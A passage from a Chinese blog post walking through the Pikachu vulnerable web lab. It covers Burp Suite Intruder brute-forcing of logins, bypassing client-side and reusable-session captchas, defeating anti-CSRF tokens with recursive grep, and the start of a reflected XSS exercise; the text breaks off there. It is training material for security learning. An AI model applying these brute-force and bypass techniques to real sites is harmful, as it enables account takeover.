<!DOCTYPE html>
<html lang="en-gb"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="content-type" content="text/html">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title itemprop="name">Pikachu靶场通关记录 | a39&#39;s blog</title>
<meta property="og:title" content="Pikachu靶场通关记录 | a39&#39;s blog" />
<meta name="twitter:title" content="Pikachu靶场通关记录 | a39&#39;s blog" />
<meta itemprop="name" content="Pikachu靶场通关记录 | a39&#39;s blog" />
<meta name="application-name" content="Pikachu靶场通关记录 | a39&#39;s blog" />
<meta property="og:site_name" content="Awesome hugo blog" />

<meta name="description" content="Web安全入门 Pikachu靶场通关记录">
<meta itemprop="description" content="Web安全入门 Pikachu靶场通关记录" />
<meta property="og:description" content="Web安全入门 Pikachu靶场通关记录" />
<meta name="twitter:description" content="Web安全入门 Pikachu靶场通关记录" />

<meta property="og:locale" content="en-gb" />
<meta name="language" content="en-gb" />

  <link rel="alternate" hreflang="en-gb" href="http://localhost:1313/posts/2022-08-28-pikachu/" title="English" />



  <meta itemprop="image" content="http://localhost:1313/" />
  <meta property="og:image" content="http://localhost:1313/" />
  <meta name="twitter:image" content="http://localhost:1313/" />
  <meta name="twitter:image:src" content="http://localhost:1313/" />




    
    
    

    <meta property="og:type" content="article" />
    <meta property="og:article:published_time" content=2022-08-28T00:00:00Z />
    <meta property="article:published_time" content=2022-08-28T00:00:00Z />

    
    <meta property="og:article:author" content="A39" />
    <meta property="article:author" content="A39" />
    <meta name="author" content="A39" />
    

    

    <script defer type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "Article",
        "headline": "Pikachu靶场通关记录",
        "author": {
        "@type": "Person",
        "name": ""
        },
        "datePublished": "2022-08-28",
        "description": "Web安全入门 Pikachu靶场通关记录",
        "wordCount":  4008 ,
        "mainEntityOfPage": "True",
        "dateModified": "2022-08-28",
        "image": {
        "@type": "imageObject",
        "url": ""
        },
        "publisher": {
        "@type": "Organization",
        "name": "a39\u0027s blog"
        }
    }
    </script>


<meta name="generator" content="Hugo 0.124.1">

    

    <link rel="canonical" href="http://localhost:1313/posts/2022-08-28-pikachu/">
    <link href="/style.min.325a4bc43b679a2bc04ceb5d0272222dc49b9cf70d7538144d3020fab38c3b4f.css" rel="stylesheet">
    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">

    
    
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/favicon.ico">
    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon.ico">
    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon.ico">
    <link rel="mask-icon" href="/icons/favicon.ico">
    <link rel="shortcut icon" href="/favicon.ico">




<link rel="manifest" href="http://localhost:1313/site.webmanifest">

<meta name="msapplication-config" content="/browserconfig.xml">
<meta name="msapplication-TileColor" content="#2d89ef">
<meta name="theme-color" content="#434648">

    <meta name="google-site-verification" content="OBu2RkZZmMk9xXDviEo5asuAjsd_8wa5j_4Ii17jFEU" />
    <meta name="msvalidate.01" content="BBF6721C148EF3AB67B2821F85888D4D" />

    
    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"
    integrity="sha512-fHwaWebuwA7NSF5Qg/af4UeDx9XqUpYpOGgubo3yWu+b2IQR4UeQwbb42Ti7gVAjNtVoI/I9TEoYeu9omwcC6g==" crossorigin="anonymous" crossorigin="anonymous" />


<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"
    integrity="sha512-LQNxIMR5rXv7o+b1l8+N1EZMfhG7iFZ9HhnbJkTp4zjNr5Wvst75AqUeFDxeRUa7l5vEDyUiAip//r+EFLLCyA=="
    crossorigin="anonymous"></script>


<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"
    integrity="sha512-iWiuBS5nt6r60fCz26Nd0Zqe0nbk1ZTIQbl3Kv7kYsX+yKMUFHzjaH2+AnM6vp2Xs+gNmaBAVWJjSmuPw76Efg==" crossorigin="anonymous" onload="renderMathInElement(document.body, {
      delimiters: [
        {left: '$$', right: '$$', display: true},
        {left: '$', right: '$', display: false}
      ]
    });"></script>
</head>
<body data-theme = "dark" class="notransition">

<script src="/js/theme.js"></script>

<div class="navbar" role="navigation">
    <nav class="menu" aria-label="Main Navigation">
        <a href="http://localhost:1313/" class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
stroke-linejoin="round" class="feather feather-home">
<title>Home</title>
<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
<polyline points="9 22 9 12 15 12 15 22"></polyline>
</svg>
        </a>
        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
        <label for="menu-trigger">
            <span class="menu-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
            </span>
        </label>

        <div class="trigger">
            <ul class="trigger-container">
                
                
                <li>
                    <a class="menu-link " href="/">
                        Home
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link active" href="/posts/">
                        Posts
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/about/">
                        About
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/friends/">
                        Friends
                    </a>
                    
                </li>
                
                <li class="menu-separator">
                    <span>|</span>
                </li>
                
                
            </ul>
            <a id="mode" href="#">
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
            </a>
        </div>
    </nav>
</div>

<div class="wrapper post">
    <main class="page-content" aria-label="Content">
        <article>
            <header class="header">
                <h1 class="header-title">Pikachu靶场通关记录</h1>
                
                
                <div class="post-meta">
                    <time datetime="2022-08-28T00:00:00&#43;00:00" itemprop="datePublished"> 28 Aug 2022 </time>
                </div>
                
            </header>
            
    
    <details class="toc" ZgotmplZ>
        <summary><b>Table of Contents</b></summary>
        <nav id="TableOfContents">
  <ul>
    <li><a href="#暴力破解">暴力破解</a>
      <ul>
        <li><a href="#概述">概述</a></li>
        <li><a href="#基本设置">基本设置</a></li>
        <li><a href="#基于表单的暴力破解">基于表单的暴力破解</a></li>
        <li><a href="#验证码绕过on-client">验证码绕过（on client）</a></li>
        <li><a href="#验证码绕过on-server">验证码绕过（on server）</a></li>
        <li><a href="#token防爆破">token防爆破</a>
          <ul>
            <li><a href="#token是什么">token是什么？</a></li>
            <li><a href="#应对方法">应对方法</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#cross-site-scripting">Cross-Site Scripting</a>
      <ul>
        <li><a href="#概述-1">概述</a></li>
        <li><a href="#反射型xss">反射型XSS</a>
          <ul>
            <li><a href="#get">GET</a></li>
            <li><a href="#post">POST</a></li>
          </ul>
        </li>
        <li><a href="#存储型xss">存储型XSS</a></li>
        <li><a href="#dom型xss">DOM型XSS</a></li>
        <li><a href="#盲打">盲打</a></li>
        <li><a href="#过滤">过滤</a></li>
        <li><a href="#htmlspecialchars">htmlspecialchars()</a></li>
        <li><a href="#xss常见防范措施">XSS常见防范措施</a>
          <ul>
            <li><a href="#herf输出">herf输出</a></li>
            <li><a href="#js输出">js输出</a></li>
          </ul>
        </li>
        <li><a href="#实例演示">实例演示</a>
          <ul>
            <li><a href="#获取cookie">获取cookie</a></li>
            <li><a href="#钓鱼搁置">钓鱼（搁置）</a></li>
            <li><a href="#获取键盘记录搁置">获取键盘记录（搁置）</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#csrf">CSRF</a>
      <ul>
        <li><a href="#概述-2">概述</a></li>
        <li><a href="#csrfgetpost">CSRF（GET&amp;POST）</a></li>
        <li><a href="#csrf-token">CSRF token</a></li>
      </ul>
    </li>
    <li><a href="#sql-inject">SQL Inject</a>
      <ul>
        <li><a href="#概述-3">概述</a></li>
        <li><a href="#数字型注入post">数字型注入（POST）</a></li>
        <li><a href="#字符型注入get">字符型注入（GET）</a></li>
        <li><a href="#搜索型注入">搜索型注入</a></li>
        <li><a href="#xx型注入">XX型注入</a></li>
        <li><a href="#数据获取">数据获取</a></li>
        <li><a href="#information_schema">information_schema</a></li>
        <li><a href="#sql函数报错的利用">SQL函数报错的利用</a>
          <ul>
            <li><a href="#updatexml">updatexml()</a></li>
            <li><a href="#extractvalue">extractvalue()</a></li>
            <li><a href="#floor">floor()</a></li>
          </ul>
        </li>
        <li><a href="#insertupdate注入">“insert/update”注入</a>
          <ul>
            <li><a href="#insert">insert</a></li>
            <li><a href="#update">update</a></li>
          </ul>
        </li>
        <li><a href="#delete注入">“delete”注入</a></li>
        <li><a href="#http-header注入">“http header”注入</a></li>
        <li><a href="#布尔盲注">布尔盲注</a></li>
        <li><a href="#时间盲注">时间盲注</a></li>
        <li><a href="#通过sql注入进行服务器远程控制">通过SQL注入进行服务器远程控制</a></li>
        <li><a href="#sql-inject漏洞爆破">SQL inject漏洞爆破</a></li>
        <li><a href="#宽字节注入">宽字节注入</a></li>
        <li><a href="#sqlmap的使用入门">SQLmap的使用入门</a></li>
        <li><a href="#sql注入漏洞的防范">SQL注入漏洞的防范</a></li>
      </ul>
    </li>
    <li><a href="#rce">RCE</a>
      <ul>
        <li><a href="#概述-4">概述</a></li>
        <li><a href="#exec-ping">exec &ldquo;ping&rdquo;</a></li>
        <li><a href="#exec-eval">exec &ldquo;eval&rdquo;</a></li>
      </ul>
    </li>
    <li><a href="#file-inclusion">File Inclusion</a>
      <ul>
        <li><a href="#概述-5">概述</a></li>
        <li><a href="#file-inclusionlocal">File Inclusion（local）</a></li>
        <li><a href="#file-inclusionremote">File Inclusion（remote）</a></li>
        <li><a href="#漏洞防范">漏洞防范</a></li>
      </ul>
    </li>
    <li><a href="#unsafe-filedownload">Unsafe Filedownload</a>
      <ul>
        <li><a href="#概述-6">概述</a></li>
        <li><a href="#unsafe-filedownload-1">Unsafe Filedownload</a></li>
        <li><a href="#防范措施">防范措施</a></li>
      </ul>
    </li>
    <li><a href="#unsafe-fileupload">Unsafe Fileupload</a>
      <ul>
        <li><a href="#概述-7">概述</a></li>
        <li><a href="#client-check">client check</a></li>
        <li><a href="#mime-type">MIME type</a></li>
        <li><a href="#getimagesize">Getimagesize</a></li>
        <li><a href="#防范措施-1">防范措施</a></li>
      </ul>
    </li>
    <li><a href="#over-permission">Over Permission</a>
      <ul>
        <li><a href="#概述-8">概述</a></li>
        <li><a href="#水平越权">水平越权</a></li>
        <li><a href="#垂直越权">垂直越权</a></li>
      </ul>
    </li>
    <li><a href="#heading">../../</a>
      <ul>
        <li><a href="#概述-9">概述</a></li>
        <li><a href="#目录遍历">目录遍历</a></li>
      </ul>
    </li>
    <li><a href="#敏感信息泄露">敏感信息泄露</a>
      <ul>
        <li><a href="#概述-10">概述</a></li>
        <li><a href="#icanseeyourabc">IcanseeyourABC</a></li>
      </ul>
    </li>
    <li><a href="#php反序列化">PHP反序列化</a>
      <ul>
        <li><a href="#概述-11">概述</a>
          <ul>
            <li><a href="#序列化serialize">序列化<code>serialize()</code></a></li>
            <li><a href="#反序列化unserialize">反序列化<code>unserialize()</code></a></li>
          </ul>
        </li>
        <li><a href="#php反序列化漏洞">PHP反序列化漏洞</a></li>
      </ul>
    </li>
    <li><a href="#xxe">XXE</a>
      <ul>
        <li><a href="#概述-12">概述</a></li>
        <li><a href="#xxe漏洞">XXE漏洞</a></li>
      </ul>
    </li>
    <li><a href="#url重定向">URL重定向</a>
      <ul>
        <li><a href="#概述-13">概述</a></li>
        <li><a href="#不安全的url跳转">不安全的URL跳转</a></li>
      </ul>
    </li>
    <li><a href="#ssrf">SSRF</a>
      <ul>
        <li><a href="#概述-14">概述</a></li>
        <li><a href="#ssrfcurl">SSRF（curl）</a></li>
        <li><a href="#ssrffile_get_content">SSRF（file_get_content）</a></li>
      </ul>
    </li>
    <li><a href="#后记">后记</a></li>
  </ul>
</nav>
    </details>
            <div class="page-content">
                <ul>
<li><em>如果发现几张图片排版不美观，其实是画廊未成功渲染，只需刷新一次就好</em></li>
</ul>
<h2 id="暴力破解">暴力破解</h2>
<h3 id="概述">概述</h3>
<p>“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。 理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 这里的认证安全策略, 包括：</p>
<ul>
<li>是否要求用户设置复杂的密码</li>
<li>是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp</li>
<li>是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）</li>
<li>是否采用了双因素认证</li>
<li>… …</li>
</ul>
<p>千万不要小看暴力破解漏洞,往往这种简单粗暴的攻击方式带来的效果是超出预期的！</p>
<h3 id="基本设置">基本设置</h3>
<p>首先需要配置火狐代理，使数据包通过BurpSuite的监控</p>
<p><img alt="img" src="./img/202208Firefox%E9%85%8D%E7%BD%AE.png"></p>
<p>代理地址127.0.0.1即为本地地址</p>
<p>点击靶场任意链接发送请求，打开BurpSuite代理（proxy）选项卡查看数据包是否被拦截</p>
<p><img alt="img" src="./img/202208%E6%95%B0%E6%8D%AE%E5%8C%85%E6%B5%8B%E8%AF%95.png"></p>
<p>被拦截的数据包</p>
<p>可见，数据包被拦截成功，基本的配置就此完成了。</p>
<h3 id="基于表单的暴力破解">基于表单的暴力破解</h3>
<p>打开页面，我们可以看到一个非常典型的登录页面，包含两个input元素和一个submit元素</p>
<p><img alt="img" src="./img/202208%E8%A1%A8%E5%8D%95-.png"></p>
<p>先随便输入些什么，根据返回的信息找点线索</p>
<p><img alt="img" src="./img/202208%E8%A1%A8%E5%8D%95-%E8%BE%93%E5%85%A5.png"></p>
<p>密码是那个数字，就是那个（掩鼻）</p>
<p>提交一下，复制一下返回信息</p>
<p><img alt="img" src="./img/202208%E8%A1%A8%E5%8D%95-%E8%BF%94%E5%9B%9E.png"></p>
<p>毫无疑问是错的 但是你先别急</p>
<p>回来看看拦截的数据（涉及隐私的一般为POST请求）</p>
<p><img alt="img" src="./img/202208%E8%A1%A8%E5%8D%95-%E8%BF%94%E5%9B%9E-%E5%8C%85.png"></p>
<p>URL编码先辈会梦见赛博林檎吗（雾）</p>
<p>右键Send to Intruder或者Ctrl+I，观察发现只有username和password两个变量与验证相关，判断可以暴力破解。</p>
<p><img alt="img" src="./img/202208%E8%A1%A8%E5%8D%95-intruder-var-1.png"></p>
<p>clear默认变量，将username和password设置为要攻击的变量，攻击方式选择多字典交叉的Cluster bomb（覆盖率较高）</p>
<p>设置Payload，上祖传字典</p>
<p><img alt="img" src="./img/202208%E8%A1%A8%E5%8D%95-PL-1.png"></p>
<p><img alt="img" src="./img/202208%E8%A1%A8%E5%8D%95-PL-2.png"></p>
<p>所谓祖传其实是GitHub上找的（）</p>
<p>配置Option-Grep筛选返回信息以鉴别爆破成功的条目</p>
<p><img alt="img" src="./img/202208%E8%A1%A8%E5%8D%95-option-grep.png"></p>
<p>还记得一开始的返回信息吗，这时候派上用场了</p>
<p>开始爆破！由于字典太大我就不浪费时间流量了，暂停一下查看阶段性成果</p>
<p><img alt="img" src="./img/202208%E8%A1%A8%E5%8D%95-attack.png"></p>
<p>点击设置的筛选返回信息排序，可以看到admin/123456没有报错且返回值长度与众不同，尝试登录一下</p>
<p><img alt="img" src="./img/202208%E8%A1%A8%E5%8D%95-success.png"></p>
<p><strong>爆破成功</strong></p>
<ul>
<li>admin/123456下面还有几个返回长度不对的账号密码，尝试登录后也不返回任何信息，应该是平台本身的bug</li>
<li>因为是第一次打靶所以记录得详细一些，之后会逐渐省略步骤偷懒</li>
</ul>
<h3 id="验证码绕过on-client">验证码绕过（on client）</h3>
<p>首先依旧是非常经典的登录页面，但是多了个长相奇怪的验证码</p>
<p><img alt="img" src="./img/2022080.png"></p>
<p>可以思考下为什么这样的验证码生活中不常见</p>
<p>故意输错验证码尝试登录</p>
<p><img alt="img" src="./img/2022082-0.png"></p>
<p>可以看到验证码错误的情况下页面不发送POST请求，所以很可能验证码相关代码是写在前端的</p>
<p>查看页面源码</p>
<p><img alt="img" src="./img/2022084-1024x44.png"></p>
<p><img alt="img" src="./img/2022083.png"></p>
<p>发现验证码表单和相关JavaScript源码</p>
<p>输入正确验证码，将POST请求数据包发送到Repeater选项卡复现，并尝试提交一个错误的验证码</p>
<p><img alt="img" src="./img/2022085.png"></p>
<p><img alt="img" src="./img/2022086.png"></p>
<p>可以看到只返回username or password is not exists而非验证码错误，说明验证码不会提交给后端验证</p>
<p>现在可以确信验证码机制是交由前端实现的了，攻击方式也就明朗了</p>
<p>操作验证码正确的POST请求数据包&ndash;&gt;Cluster bomb&ndash;&gt;设置username、password为变量&ndash;&gt;设置字典和筛选返回信息&ndash;&gt;Start attack</p>
<p><img alt="img" src="./img/2022081.png"></p>
<p><img alt="img" src="./img/2022087.png"></p>
<p><img alt="img" src="./img/2022088.png"></p>
<p><strong>爆破成功</strong></p>
<p>事后(?)翻翻后端代码，果然，源码仅对username和password做POST请求，进一步证实验证码机制完全交由前端实现（JavaScript实现）</p>
<p><img alt="img" src="./img/2022089.png"></p>
<p>现在也可以回答之前的问题了，这种完全由前端（JS、cookie等）实现的验证码机制根本无法保证安全，所以现今的验证码机制都交由更安全的后端来实现</p>
<h3 id="验证码绕过on-server">验证码绕过（on server）</h3>
<p>这次的登录页面就是生活中非常常见的形式了，验证码也是图片型的，点击或刷新都会改变验证码</p>
<p><img alt="img" src="./img/2022081-try.gif"></p>
<p>首先我们还是走个流程，抓个包看看不同的输入会返回什么信息</p>
<p><img alt="img" src="./img/2022081-usr-edited.png"></p>
<p><img alt="img" src="./img/2022081-%E9%94%99.png"></p>
<p><img alt="img" src="./img/2022081-%E7%A9%BA.png"></p>
<p>换主题和字号了，可喜可贺可喜可贺</p>
<p>可以看到无论输入正确与否都会通过POST请求交由后端处理，属于典型的后端实现</p>
<p>服务器在生成并发送验证码图片时会把验证码信息储存在session里，而session一般会有时效，如果可以在时效内进行爆破则有可能成功</p>
<p>接下来发送数据包到Repeater修改账号密码尝试Send一下，看看session能不能被重复利用</p>
<p><img alt="img" src="./img/2022082-re-usr.png"></p>
<p>浏览器页面刷新后记得改一下请求的新验证码</p>
<p>返回的信息是username or password is not exists，证明session是可以被重复利用的</p>
<p>接下来走流程爆破，不再赘述</p>
<p><img alt="img" src="./img/2022082-success.png"></p>
<p><strong>爆破成功</strong></p>
<p>完事我们看看后端源码</p>
<p><img alt="img" src="./img/2022083-1.png"></p>
<p><img alt="img" src="./img/2022083-2.png"></p>
<p>先来说说session。session其实和cookie非常相似，都负责储存用户信息以避免重复的信息验证、减轻服务器压力并优化用户浏览体验，只不过cookie储存在浏览器内而session储存在服务器内</p>
<p>由于没有设置时限，session默认有效时间为30分钟，这就给了我们很大的攻击空间。正确的设置方法应该是每次验证完成后销毁session里的相关信息，保证session不会被重复利用</p>
<p>session和cookie都包含有我们重要的身份信息，因此黑客常常设法窃取它们以绕过登录验证，所以一定要提高警惕，保护好自己浏览器里的cookie并适当及时清理，防患于未然</p>
<h3 id="token防爆破">token防爆破</h3>
<h4 id="token是什么">token是什么？</h4>
<blockquote>
<p>百度百科</p>
<p><em>Token</em>在计算机身份认证中是令牌（临时）的意思，在词法分析中是标记的意思。一般作为邀请、登录系统使用。</p>
</blockquote>
<p>说白了，token（“令牌”）就是一个对页面或者用户的唯一标志</p>
<p>那么，使用token可以通过标志页面从而防止大量重复提交请求的爆破手段吗？答案是不能</p>
<h4 id="应对方法">应对方法</h4>
<p>这次是一个没有验证码的毫无防备的纯良表单</p>
<p><img alt="img" src="./img/2022080-2.png"></p>
<p>但事实果真如此吗？先抓个包试试</p>
<p><img alt="img" src="./img/2022081-re-err.png"></p>
<p>我们发现，更改账号密码提交后返回一个csrf token error，可见数据包的确被POST去后端但是被拒绝登录了，返回的也不是username or password is not exists</p>
<p>来看看网页源码</p>
<p><img alt="img" src="./img/2022081-source-token.png"></p>
<p><img alt="img" src="./img/2022081-token-f5.gif"></p>
<p>原来是给页面加上了token，而且在每次页面刷新后都会发送一个新的token，而旧的token就会失效</p>
<p>这下似乎无解了 但是你先别急</p>
<p>捋一捋思路不难想到，只要写个脚本，在每次提交数据时重新获取一遍新的token不就可以顺利爆破了吗</p>
<p>强大的Burp Suite也内置了这个功能</p>
<p>我们在设置变量的时候把token也选上，并给变量token选择Recursive grep（递归查找）</p>
<p><img alt="img" src="./img/2022082-playload.png"></p>
<p>Option&ndash;&gt;Redirections（重定向）里勾选上Always</p>
<p><img alt="img" src="./img/2022082-red.png"></p>
<p>Payload&ndash;&gt;Grep-Extract里add上token的值</p>
<p><img alt="img" src="./img/2022082-add-to.png"></p>
<p><img alt="img" src="./img/2022082-add.png"></p>
<p>Payload&ndash;&gt;Payload Options [Recursive grep]</p>
<p><img alt="img" src="./img/2022082-playload-opt.png"></p>
<p>另外，start之前出现一个奇怪的报错：Error:recursive grep payloads cannot be used with multiple request threads</p>
<p>解决办法：新建一个最高并发为1的Resource pool并选上</p>
<p><img alt="img" src="./img/202208err.png"></p>
<p>这里截图没截好，应该选第二个新建的Resource pool</p>
<p>OK准备完毕，Start attack</p>
<p><img alt="img" src="./img/2022083-success.png"></p>
<p>其实是爆破成功了，但是后台并没有返回错误或登陆成功，应该也是bug</p>
<p>由此看来，token也并不能保证安全</p>
<h2 id="cross-site-scripting">Cross-Site Scripting</h2>
<h3 id="概述-1">概述</h3>
<p>Cross-Site Scripting（跨站脚本）简称为“CSS”，为避免与前端叠成样式表的缩写&quot;CSS&quot;冲突，故又称XSS。一般XSS可以分为如下几种常见类型：</p>
<ul>
<li>反射型XSS
<ul>
<li>交互的数据一般不会被存在数据库里，一次性、所见即所得，一般出现在查询类页面等</li>
</ul>
</li>
<li>存储型XSS
<ul>
<li>交互的数据会被存在数据库里面，永久性存储，一般出现在留言板、注册等页面（危害最大）</li>
</ul>
</li>
<li>DOM型XSS
<ul>
<li>不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的XSS，一次性，也属于反射型（危害较小）</li>
</ul>
</li>
</ul>
<p>XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位
XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户
XSS漏洞可以用来进行钓鱼攻击、前端js挖矿、用户cookie获取… …甚至可以结合浏览器自身漏洞对用户主机进行远程控制等
形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害
因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理：</p>
<ul>
<li>输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入</li>
<li>输出转义：根据输出点的位置对输出到前端的内容进行适当转义</li>
</ul>
<p>XSS漏洞的主要测试流程如下：</p>
<ol>
<li>在目标站点上找到输入点，比如查询接口、留言板等</li>
<li>输入一组“特殊字符+唯一识别字符”，提交后查看返回的源码是否有被做对应的处理</li>
<li>通过搜索定位唯一识别字符，结合字符前后语法确认是否可以构造执行JavaScript的条件（构造闭合）</li>
<li>提交构造的脚本代码（以及各种绕过方式）看是否可以成功执行，如果成功则说明存在XSS漏洞</li>
</ol>
<h3 id="反射型xss">反射型XSS</h3>
<h4 id="get">GET</h4>
<p>现在页面上是一个非常常见的输入框</p>
<p><img alt="img" src="./img/2022080-3.png"></p>
<p>我们先来尝试输入一些特殊符号加一个方便查找的字符串：<code>'&quot;&lt;&gt;0721</code></p>
<p><img alt="img" src="./img/2022080-try.png"></p>
<p><img alt="img" src="./img/2022080-try-re.png"></p>
<p><img alt="img" src="./img/2022081-script-source.png"></p>
<p>看来后端并没有对这些特殊符号进行过滤，判断可以进行攻击了</p>
<p>输入一段JavaScript</p>
<p><img alt="img" src="./img/2022081-script-0.png"></p>
<p>限制输入长度了，改改表单属性</p>
<p><img alt="img" src="./img/2022081-script-1.png"></p>
<p>点击提交</p>
<p><img alt="img" src="./img/2022081-script-success.png"></p>
<p>成功让JavaScript执行，弹出消息框</p>
<p>我们来看看现在的前端页面源码</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;xssr_main&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;xssr_title&#34;</span><span class="p">&gt;</span>Which NBA player do you like?<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;get&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;xssr_in&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">maxlength</span><span class="o">=</span><span class="s">&#34;20&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;message&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;xssr_submit&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;notice&#39;</span><span class="p">&gt;</span>who is &#39;&#34;<span class="err">&lt;</span>&gt;0721,i don&#39;t care!<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>           
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
